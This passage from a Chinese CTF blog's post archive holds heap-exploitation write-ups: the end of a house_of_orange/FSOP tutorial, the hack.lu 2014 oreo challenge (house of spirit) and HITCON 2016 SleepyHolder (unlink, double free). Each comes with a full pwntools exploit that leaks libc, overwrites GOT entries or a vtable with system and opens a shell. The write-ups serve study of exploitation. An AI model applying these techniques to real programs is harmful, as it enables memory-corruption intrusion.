chunk的空间，触发brk来拓展top chunk。原top chunk将会被放入unsorted bin1build(0x1000, 'aaaa')1234//内存情况：//因为我不是同一次运行，地址可能和前面不匹配unsortedbinall: 0x7f7ab34f37b8 (main_arena+88) —▸ 0x5598255700a0 ◂— 0x7f7ab34f37b8再申请一个大小合适的large chunk，该chunk将会从unsorted bin中切割下来。1build(0x400, 'a'*0x8)123456//内存情况：pwndbg&gt; x/32gx 0x559d1a1d40c00x559d1a1d40c0: 0x0000000000000000 0x00000000000004110x559d1a1d40d0: 0x6161616161616161 0x00007f732b8fddc8 &lt;== libc0x559d1a1d40e0: 0x0000559d1a1d40c0 0x0000559d1a1d40c0 &lt;== heap0x559d1a1d40f0: 0x0000000000000000 0x0000000000000000调用see()，输出name时，将会把libc的地址泄露出来。再调用upgrade()，把bk也全部填充为’a’，那么下一次see()就可以泄露出heap的地址。劫持流程接下来将会涉及到IO_FILE的利用，这种方法被称为FSOP(File Stream Oriented Programming)FILE介绍FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。FILE结构在程序执行fopen等函数时会进行创建。每个FILE结构都通过一个 _IO_FILE_plus结构体来定义，结构体如下：12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;;其中包括一个_IO_FILE结构体和一个vtable(虚表)指针。_IO_FILE结构体保存了FILE的各种信息。vtable(虚表)指针指向了一系列函数指针，稍后就会用到其中的函数。_IO_FILE结构定义如下：123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;整个结构不用完全掌握，大概了解就行。在进程中的产生的各个_IO_FILE结构会通过其中的struct _IO_FILE *_chain;连接在一起形成一个链表，其中表头使用全局变量struct _IO_FILE_plus *_IO_list_all来表示，通过_IO_list_all就可以遍历所有_IO_FILE结构。_IO_jump_t *vtable结构定义如下:1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;;这里面保存了一系列的函数指针。以上，主要需要了解的就是 _IO_FILE_plus、_IO_FILE、vtable3个结构以及 _IO_list_all指针的关系和及其内容。_IO_FILE各个成员的偏移如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667_IO_FILE_plus = &#123; 'i386':&#123; 0x0:'_flags', 0x4:'_IO_read_ptr', 0x8:'_IO_read_end', 0xc:'_IO_read_base', 0x10:'_IO_write_base', 0x14:'_IO_write_ptr', 0x18:'_IO_write_end', 0x1c:'_IO_buf_base', 0x20:'_IO_buf_end', 0x24:'_IO_save_base', 0x28:'_IO_backup_base', 0x2c:'_IO_save_end', 0x30:'_markers', 0x34:'_chain', 0x38:'_fileno', 0x3c:'_flags2', 0x40:'_old_offset', 0x44:'_cur_column', 0x46:'_vtable_offset', 0x47:'_shortbuf', 0x48:'_lock', 0x4c:'_offset', 0x54:'_codecvt', 0x58:'_wide_data', 0x5c:'_freeres_list', 0x60:'_freeres_buf', 0x64:'__pad5', 0x68:'_mode', 0x6c:'_unused2', 0x94:'vtable' &#125;, 'amd64':&#123; 0x0:'_flags', 0x8:'_IO_read_ptr', 0x10:'_IO_read_end', 0x18:'_IO_read_base', 0x20:'_IO_write_base', 0x28:'_IO_write_ptr', 0x30:'_IO_write_end', 0x38:'_IO_buf_base', 0x40:'_IO_buf_end', 0x48:'_IO_save_base', 0x50:'_IO_backup_base', 0x58:'_IO_save_end', 0x60:'_markers', 0x68:'_chain', 0x70:'_fileno', 0x74:'_flags2', 0x78:'_old_offset', 0x80:'_cur_column', 0x82:'_vtable_offset', 0x83:'_shortbuf', 0x88:'_lock', 0x90:'_offset', 0x98:'_codecvt', 0xa0:'_wide_data', 0xa8:'_freeres_list', 0xb0:'_freeres_buf', 0xb8:'__pad5', 0xc0:'_mode', 0xc4:'_unused2', 0xd8:'vtable' &#125;&#125;[注]在gdb中查看这些结构的指令:123456//查看_IO_list_all指针p *_IO_list_all//查看_IO_FILE_plusp (*(struct _IO_FILE_plus *) 0x55cdf66034f0)//查看vtablep (*(struct _IO_jump_t *) 0x55cdf66034f0)unsortedbin attack根据house of orange的流程，接下来将要控制_IO_list_all指针的值，具体原因后面会讲到。这里我们采用unsortedbin attack来对它的值进行修改。原理在从unsorted bin中取出chunk时，会执行以下代码：12345 bck = victim-&gt;bk; .../* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av);这里将最后一个chunk取出，并把倒数第二个chunk的fd设置为unsorted_chunks(av)，这里unsorted_chunks(av)就是main_arena中top成员变量的地址(&amp;main_arena+88)。123456789101112131415//main_arena的结构struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; //此处的地址将被写入目标地址 mchunkptr last_remainder; ...&#125;可以发现，如果我们将victim的bk改写为某个地址，则可以向这个地址 + 0x10的地方写入&amp;main_arena+88。因为题目程序中存在堆溢出，所以可以轻松溢出到某个chunk的bk，并将它改写。这里我们写入_IO_list_all - 0x10，这样当从unsorted bin中取出它时，就可以成功将_IO_list_all写为&amp;main_arena+88。具体利用过程需要和后面FSOP配合。FSOP漏洞原理因为_IO_FILE结构使用链表的结构管理，表头由_IO_list_all维护。所以FSOP的核心思想就是劫持_IO_list_all的值并伪造链表和其中的_IO_FILE在此之前，我们先了解一下malloc对错误信息的处理过程.在malloc出错时，会调用malloc_printerr函数来输出错误信息12if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)|| __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);而malloc_printerr又会调用__libc_message;__libc_message又调用abort;abort则又调用了_IO_flush_all_lockp最后_IO_flush_all_lockp中会调用到vtable中的_IO_OVERFLOW函数整个流程如下图：所以如果可以控制_IO_list_all的值，同时够伪造一个_IO_FILE及其vtable并放入FILE链表中，就可以让上述流程进入我们伪造的vtable, 并调用被修改为system的_IO_OVERFLOW函数。但是想要成功调用_IO_OVERFLOW函数还需要绕过一些阻碍12345678910111213141516171819int _IO_flush_all_lockp (int do_lock)&#123; ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) ... ... fp = fp-&gt;_chain; &#125;&#125;观察代码发现，_IO_OVERFLOW存在于if之中，根据短路原理，若要执行到_IO_OVERFLOW，就需要让前面的判断都能满足，即：12fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或者123_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base）以上两个条件至少要满足一个，这里我们将选择第一个，只需要构造mode、_IO_write_ptr和_IO_write_base。因为这些都是我们可以伪造的_IO_FILE中的数据，所以比较容易实现。漏洞利用在前面已经介绍过，可以通过unsortedbin attack来将_IO_list_all指针的值修改为&amp;main_arena+88。但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、_IO_write_ptr和_IO_write_base的对应偏移处构造出合适的值。所以我们将目光转向_IO_FILE的链表特性。在前文_IO_flush_all_lockp函数的代码最后，可以发现程序通过fp = fp-&gt;_chain不断的寻找下一个_IO_FILE。所以如果可以修改fp-&gt;_chain到一个我们伪造好的_IO_FILE的地址，那么就可以成功实现利用了。巧妙的是，_IO_FILE结构中的chian字段对应偏移是0x68，而在&amp;main_arena+88对应偏移为0x68的地址正好是大小为0x60的small bin的bk，而这个地址的刚好是我们可以控制的。1234567891011121314151617+0x00 [ top | last_remainder ]+0x10 [ unsorted bin fd | unsorted bin bk ]+0x20 [ smallbin 0x20 fd | smallbin 0x20 bk ]+0x30 [ smallbin 0x30 fd | smallbin 0x30 bk ]+0x40 [ smallbin 0x40 fd | smallbin 0x40 bk ]+0x50 [ smallbin 0x50 fd | smallbin 0x50 bk ]+0x60 [ smallbin 0x60 fd | smallbin 0x60 bk ]pwndbg&gt; x/64gx _IO_list_all0x7fdd7442c7b8 &lt;main_arena+88&gt;: 0x00005616d200b010 0x00005616d1fe94f00x7fdd7442c7c8 &lt;main_arena+104&gt;: 0x00005616d1fe94f0 0x00007fdd7442d1900x7fdd7442c7d8 &lt;main_arena+120&gt;: 0x00007fdd7442c7c8 0x00007fdd7442c7c80x7fdd7442c7e8 &lt;main_arena+136&gt;: 0x00007fdd7442c7d8 0x00007fdd7442c7d80x7fdd7442c7f8 &lt;main_arena+152&gt;: 0x00007fdd7442c7e8 0x00007fdd7442c7e80x7fdd7442c808 &lt;main_arena+168&gt;: 0x00007fdd7442c7f8 0x00007fdd7442c7f80x7fdd7442c818 &lt;main_arena+184&gt;: 0x00005616d1fe94f0 0x00005616d1fe94f0 &lt;== 此处0x7fdd7442c828 &lt;main_arena+200&gt;: 0x00007fdd7442c818 0x00007fdd7442c818我们如果通过溢出，将位于unsorted bin中的chunk的size修改为0x60。（注：现在unsorted bin中的chunk就是之前被释放的top chunk的一部分）那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入大循环，把unsorted bin中的chunk放回到对应的small bin或large bin中（具体流程参考ctfwiki）因此，我们修改过size的chunk就会被放入大小为0x60的small bin中，同时，该small bin的fd和bk都会变为此chunk的地址。这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。只要在这个chunk中伪造好_IO_FILE结构体以及vtable，把_IO_OVERFLOW设置为system，然后就可以成功getshell了。利用过程直接构造payload首先是padding，抵达被释放掉的top chunk。1payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)接下来构造的内存具有双重身份，一是作为伪造的_IO_FILE；一是用于unsorted attack的victim chunk，因为它位于unsorted bin中。然后开始构造_IO_FILE。因为要调用的_IO_OVERFLOW (fp, EOF)被修改后为system(fp)，所以在开头写入&#39;/bin/sh\x00&#39;，让fp = &quot;/bin/sh&quot;；又因为为了将这个chunk放入smallbin 0x60，所以将size位设置为0x61。1fake_file = '/bin/sh\x00' + p64(0x61)然后将bk的位置写入(IO_list_all - 0x10，用作unsorted attack1fake_file += p64(0) + p64(IO_list_all - 0x10)接下来的位置刚好是_IO_write_base和IO_write_ptr。前面提到过需要构造fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base1fake_file += p64(0) + p64(1) #_IO_write_base ; _IO_write_ptr接下来需要一段padding，直至fp-&gt;mode1fake_file = fake_file.ljust(0xc0, '\x00') #padding抵达fp-&gt;mode，构造fp-&gt;_mode &lt;= 01fake_file += p64(0) #mode &lt;= 0然后需要设置vtable指针，将它设置到当前地址相邻往后的地址，然后继续在后面构造vtable就行了123payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtable指针构造vtable12payload += p64(0)*3 #vtablepayload += p64(system) #将__overflow改为system写入数据1upgrade(0x800, payload)触发漏洞12p.recvuntil('Your choice : ')p.sendline('1')调用build函数，由最初的分析可知，此处会申请3个chunk。申请第一个chunk时，大小为0x20，因为fastbin中没有chunk，所以会进入大循环，将我们前面构造好的chunk放入smallbin 0x60。在从unsorted bin中取出这个chunk时，又会触发unsortedbin attack，改写_IO_list_all指针。至此，所有数据都布置好了。因为unsortedbin attack的时候破坏了unsorted bin的链表结构，所以接下来的分配过程会出现错误，系统调用malloc_printerr去打印错误信息，从而被我们劫持流程，执行到system函数。EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#-*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'bash', '-c']p = process('./house_of_orange')elf = ELF('./house_of_orange')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def build(size, name): p.recvuntil('Your choice : ') p.sendline('1') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name :') p.send(name) p.recvuntil('Price of Orange:') p.sendline('8') p.recvuntil('Color of Orange:') p.sendline('1')def see(): p.recvuntil('Your choice : ') p.sendline('2')def upgrade(size, name): p.recvuntil('Your choice : ') p.sendline('3') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name:') p.send(name) p.recvuntil('Price of Orange: ') p.sendline('8') p.recvuntil('Color of Orange: ') p.sendline('1')build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)#将topchunk放入unsortedbinbuild(0x1000, 'aaaa')#从unsortedbin中取出一部分topchunkbuild(0x400, 'a'*0x8)see()p.recvuntil('aaaaaaaa')libc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3C2DC8print "libc_base : %#x" % libc_base upgrade(0x400, 'a'*0x10)see()p.recvuntil('a'*0x10)heap_addr = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0xc0print "heap_addr : %#x" % heap_addrsystem = libc_base + libc.symbols['system']IO_list_all = libc_base + libc.symbols['_IO_list_all']print "system : %#x" % systemprint "_IO_list_all : %#x" % IO_list_allpayload = 'a' * 0x400 #paddingpayload += p64(0) + p64(0x21) #paddingpayload += p32(1) + p32(0x1f) + p64(0) #paddingfake_file = '/bin/sh\x00' + p64(0x61) # fp; sizefake_file += p64(0) + p64(IO_list_all - 0x10) # fd; bkfake_file += p64(0) + p64(1) # _IO_write_base ; _IO_write_ptrfake_file = fake_file.ljust(0xc0, '\x00') #paddingfake_file += p64(0) # mode &lt;= 0payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtable指针payload += p64(0)*3 # vtablepayload += p64(system) # 将__overflow改为systemupgrade(0x800, payload)gdb.attach(p)p.recvuntil('Your choice : ')p.sendline('1')p.interactive()程序链接house of orange后记这篇文章写得是真的乱233333在写好exp后，运行最后会报memory corruption，我还以为出错了，又调了半天_(:зゝ∠)_，最后才反应过来程序本来就要调用malloc_printerr。。。默默输了个ls，看到回显感动得一匹。话说这exp有一定概率会失败，并不清楚原因_(:зゝ∠)_。]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>house_of_orange</tag>
        <tag>IO_FILE</tag>
        <tag>unsortedbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hack.lu2014-oreo writeup]]></title>
    <url>%2Fpost%2F1b661c73.html</url>
    <content type="text"><![CDATA[题目描述题目来源：hack.lu CTF 2014知识点：house of spirit挺老的一道题目了，不过是how2heap和ctfwiki上的例题。题目是一个买卖枪支的系统，同样是常规的增删查改，32位程序。12345678910Welcome to the OREO Original Rifle Ecommerce Online System!What would you like to do?1. Add new rifle2. Show added rifles3. Order selected rifles4. Leave a Message with your Order5. Show current stats6. Exit!Action:保护如下：123456[*] &apos;/home/nick/pwn_learn/heapLearn/house_of_spirit/hack-lu2014_oreo&apos; Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE程序概况add函数：12345678910111213v1 = head;head = (char *)malloc(56u);if ( head )&#123; *((_DWORD *)head + 13) = v1; printf("Rifle name: "); fgets(head + 25, 56, stdin); sub_80485EC(head + 25); printf("Rifle description: "); fgets(head, 56, stdin); sub_80485EC(head); ++cnt;&#125;函数会读取名称和描述，并将名称、描述以及上一个枪支的地址一起存入结构体中，构成一个链表结构。结构体如下：1234500000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 description db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ?00000038 rifle ends同时注意到，fgets函数读取的长度为56个字节，所以可以发生溢出。show函数：123456for ( i = head; i; i = (rifle *)i-&gt;next )&#123; printf("Name: %s\n", i-&gt;name); printf("Description: %s\n", i); puts("===================================");&#125;通过链表依次访问每个枪支，输出名称和描述。Free函数(Order)：遍历链表，依次将所有枪支都free掉，然后将链表头置0message函数：向dword_804A2A8指向的地址写入字符串。而在程序开头dword_804A2A8 = (char *)&amp;unk_804A2C0;，所以是向unk_804A2C0处写入。1234567.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h.bss:0804A2C0 unk_804A2C0 db ? ; ; DATA XREF: main+29↑o.bss:0804A2C1 db ? ;.bss:0804A2C2 db ? ;.bss:0804A2C3 db ? ;漏洞分析泄露libc基址因为程序通过链表来管理枪支，恰好在枪支结构体中存在溢出，所以可以通过从name溢出到next指针，将next修改到任意地址，再通过show就可以任意地址读了。这里可以通过泄露puts_got,然后通过偏移来算出libc基址。house of spirit因为可以控制next指针，也就意味着可以在任意地方free，那么可以构造house of spirit。如果可以在massage指针dword_804A2A8处布置好一个fake chunk用于绕过free的检查，那么就可以在此处分配一个chunk，massage指针将会被控制，从而实现任意地址写。构造fake chunk若要让dword_804A2A8在chunk内部，首先需要在它的上方构造出这个chunk的size，可以发现，在对枪支进行计数的cnt变量刚好在0x804A2A4的位置，所以只需要添加一定数量的枪支，就可以达到我们想要的size。12345678.bss:0804A2A0 dword_804A2A0 dd ? ; DATA XREF: Free+5A↑r.bss:0804A2A0 ; Free+62↑w ....bss:0804A2A4 cnt dd ? ; DATA XREF: add+C5↑r.bss:0804A2A4 ; add+CD↑w ....bss:0804A2A8 ; char *dword_804A2A8.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h因为一个枪支结构体的大小为0x38，加上chunk header后的size属于0x40这个fast bin，所以需要将fake chunk的size设置为0x40，也就是添加0x40个枪支然后需要绕过对next chunk的检查，通过写入message，将对应next chunk的size和prevsize都构造好。（详见exp）构造好后：1234560x804a288: 0x00000000 0x00000000 0x00000000 0x000000000x804a298: 0x00000000 0x00000000 0x00000001 0x00000041 &lt;== size0x804a2a8: 0x0804a2c0 0x00000000 0x00000000 0x00000000 &lt;== message指针0x804a2b8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2c8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2d8: 0x00000000 0x00000000 0x00000040 0x00000050 &lt;== prevsize size实现任意地址写在fake chunk构造好后，就可以将dword_804A2A8写入next指针，然后free，在message指针处构造好的fake chunk将会进入fast bin。重新添加枪支，fake chunk将会从bins中取出，通过设置枪支的description，就可以修改massage指针了，此时在调用message函数就能实现任意地址写注意程序中没有setvbuf，所以不会及时的回显数据，在编写exp时有些时候不用recvexp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./hack-lu2014_oreo')elf = ELF('./hack-lu2014_oreo')libc = ELF('/lib/i386-linux-gnu/libc-2.19.so')def add(name, description): p.sendline('1') p.sendline(name) p.sendline(description)def show(): p.sendline('2') p.recvuntil('=\n')def free(): p.sendline('3')def leaveMsg(msg): p.sendline('4') p.sendline(msg)def leak(addr): add('a'*27 + p32(addr), 'a') show() p.recvuntil('Description: ') p.recvuntil('Description: ') res = u32(p.recvuntil('\n', drop=True)[:4]) p.recvuntil('\n') return res#泄露libclibc_base = leak(elf.got['puts']) - libc.symbols['puts']system = libc_base + libc.symbols['system']print "libc_base : %#x" % libc_baseprint "system : %#x" % system#添加0x40个枪支，构造size位for _ in range(0x40-1): add('a', 'a')#将massage指针的地址写到next指针中add('a'*27 + p32(0x0804A2A8), 'a')#构造next chunk，将prevsize设为0x40，size设为0x50payload = '\x00'*0x20 + p32(0x40) + p32(0x50)leaveMsg(payload)#把fake chunk放入fast binfree()p.recvuntil('Okay order submitted!\n')#重新把fake chunk分配出来，并在description写入strlen_got，相当于将message指针改为指向strlen的got表add('a' ,p32(elf.got['strlen']))#写入message，相当于向strlen_got中写入system。#因为在leaveMsg函数中，fgets之后就会调用strlen，所以顺便就可以getshell了#这里使用分号是因为linux命令中可以使用';'来分割两条指令，所以这里相当于把/bin/sh当做第二条执行的指令了，而第一个p32(system)是个无效指令罢了leaveMsg(p32(system) + ';/bin/sh')p.interactive()相关链接题目链接：oreowriteup参考：ctfwiki]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>ctfwiki</tag>
        <tag>house_of_spirit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2016-SleepyHolder writeup]]></title>
    <url>%2Fpost%2Fe99b1303.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2016知识点：unlink、double free这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。123456Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to hold your secrets, and no one will be able to see it :)1.Keep secret2.Wipe secret3.Renew secret程序保护如下123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE程序概况keep函数：1234What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it forever根据选择不同的secret申请不同大小的内存，分别是40、4000、400000个字节。其中每个大小的chunk只能申请一次。wipe函数：12345678910if ( v0 == 1 )&#123; free(buf); dword_6020E0 = 0;&#125;else if ( v0 == 2 )&#123; free(qword_6020C0); dword_6020D8 = 0;&#125;只能删除small和big两种secret。free之后没有清空指针，存在double free漏洞renew函数：同样只能重写small和big两种secret，因为会检查是否使用的标记，所以不能UAF漏洞分析double free因为free之后没有清空指针，所以可以造成double free漏洞。这里double free可以用于辅助unlink。修改inuse位依次分配small和big两个secret，然后释放掉small secret，small secret将进入fast bin。此时再申请large secret。由于这是一个large chunk，会先利用malloc_consolidate处理fastbin中的chunk，将能合并的chunk合并后放入unsortedbin，不能合并的就直接放到unsortedbin，这样的目的是减少堆中的碎片。所以small secret将会进入unsorted bin，于此同时，big secret的inuse位也将会被置0。再次释放small secret。因为之前释放的small secret已经不在fast bin中，所以此时不会被检测到double free。申请small secret。从fast bin中取回small secret。这样就达到了修改inuse位的目的unlink前提知识：由于堆块的复用机制，当前一个chunk还在被使用时，后一个chunk的prevsize是归属于前一chunk，作为前一个chunk的数据区域。程序中，small secret的大小为0x28，刚好可以利用到下一个chunk的prevsize。如下：12345670x6032e0: 0x0000000000000000 0x0000000000000031 &lt;== small secret0x6032f0: 0x6161616161616161 0x61616161616161610x603300: 0x6161616161616161 0x61616161616161610x603310: **0x0a61616161616161** 0x0000000000000fb1 &lt;== big secret0x603320: 0x6262626262626262 0x62626262626262620x603330: 0x6262626262626262 0x62626262626262620x603340: 0x6262626262626262 0x000000000000000a所以可以通过double free来改变big secret的inuse位，又可以控制big secret的prevsize，且堆指针是全局变量，可以成功实现unlink。漏洞利用按照前文方法修改inuse位在small secret构造一个fake chunk，并修改big chunk的prevsize释放big secret，触发unlink通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址算出system的地址，并将其写入free_got调用free，成功getshell我的exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./SleepyHolder')elf = ELF('./SleepyHolder')libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')def add(index, content): p.recvuntil('3. Renew secret\n') p.sendline('1') p.recvuntil('\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content) def delete(index): p.recvuntil('3. Renew secret\n') p.sendline('2') p.recvuntil('2. Big secret\n') p.send(str(index))def update(index, content): p.recvuntil('3. Renew secret\n') p.sendline('3') p.recvuntil('2. Big secret\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content)#分配chunk1 chunk2add(1, 'a'*0x10)add(2, 'b'*0x10)#释放chunk1delete(1)#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0add(3, 'c'*0x10)#这时再释放chunk1，让chunk1重新进入fast bindelete(1)heap_ptr = 0x6020d0 #堆指针#准备unlink，在chunk1中伪造chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_sizeadd(1, payload)#此时chunk2的inuse位是0，所以触发unlinkdelete(2)free_got = elf.got['free']atoi_got = elf.got['atoi']puts_got = elf.got['puts']puts = elf.symbols['puts']system_off = libc.symbols['system']atoi_off = libc.symbols['atoi']#unlink后 堆指针被修改，向现在指针所指内存写入数据#将chunk2指针覆盖为atoi_got#将chunk3指针覆盖为puts_got#将chunk1指针覆盖为free_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#再次向chunk1写入，相当于向free_got写入#这里将free_got写为putsupdate(1, p64(puts))#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址#由此可计算出libc_basedelete(2)libc_base = u64(p.recv(6) + '\x00\x00') - atoi_off#通过调试发现，这里只能取6个字节print "libc_base : %#x" % libc_base system = libc_base + system_off#将free的got表写为systemupdate(1, p64(system))#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数add(2, '/bin/sh\x00')delete(2)p.interactive()相关链接题目链接：SleepyHolderexp参考：how2heap、https://blog.csdn.net/qq_33528164/article/details/80040197]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>double_free</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之fastbin attack]]></title>
    <url>%2Fpost%2F531412d5.html</url>
    <content type="text"><![CDATA[原理fastbin attack是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。主要利用了fast bin的单链表管理机制。相关源码：malloc：123456789101112131415161718/* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) &#123; // 得到对应的fastbin的下标 idx = fastbin_index(nb); // 得到对应的fastbin的头指针 mfastbinptr *fb = &amp;fastbin(av, idx); mchunkptr pp = *fb; // 利用fd遍历对应的bin内是否有空闲的chunk块， do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim); ...这里首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表指针，然后将头指针的下一个chunk（victim-&gt;fd）作为空闲chunk链表的头部（取出头部的chunk）。这里catomic_compare_and_exchange_val_acq是使用了lock-free的技术实现单向链表删除第一个node的操作，暂时不必关注。可以注意到，这里是通过fd指针来获取下一个chunk的。所以如果可以控制某个fast 